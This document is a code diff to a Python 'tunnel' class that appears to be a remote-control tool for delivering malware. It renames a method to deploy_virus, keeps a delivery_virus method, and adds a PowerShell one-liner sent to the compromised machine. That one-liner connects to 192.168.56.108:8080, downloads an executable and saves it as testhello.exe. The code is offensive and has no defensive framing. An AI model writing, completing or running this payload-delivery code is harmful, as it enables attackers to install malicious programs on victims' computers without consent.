@@ -21,7 +21,13 @@ class tunnel:
         time.sleep(1)
         
     def get_response(self):
-        return self.conn.recv(1024).decode()
+        data = b''
+        while True:
+            chunk = self.conn.recv(1024)
+            if not chunk:
+                break
+            data += chunk
+        return data
     
     def delivery_virus(self, virus):
         self.conn.sendall(virus)
@@ -53,13 +59,16 @@ class tunnel:
         
    
         
-    def deploy_server(self, data):
+    def deploy_virus(self, data):
         serversocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         host = "0.0.0.0"
         port = 8081
         serversocket.bind((host,port))
         serversocket.listen(5)
         print("Deployment Server listening on port", port)
+        
+        ask_to_download = 'powershel -c ($client = New-Object System.Net.Sockets.TcpClient; $client.Connect("192.168.56.108", 8080); $stream = $client.GetStream(); $buffer = New-Object byte[] 1024; $receivedBytes = 0; $totalBytes = 0; $file = New-Object System.IO.FileStream("testhello.exe", [System.IO.FileMode]::Create); do { $receivedBytes = $stream.Read($buffer, 0, 1024); $totalBytes += $receivedBytes; $file.Write($buffer, 0, $receivedBytes); } while ($receivedBytes -ne 0); $file.Close(); $client.Close();)'
+        self.sent_command(ask_to_download.encode())
         clientsocket,addr = serversocket.accept()
         print("Got a connection from", addr)
         try:
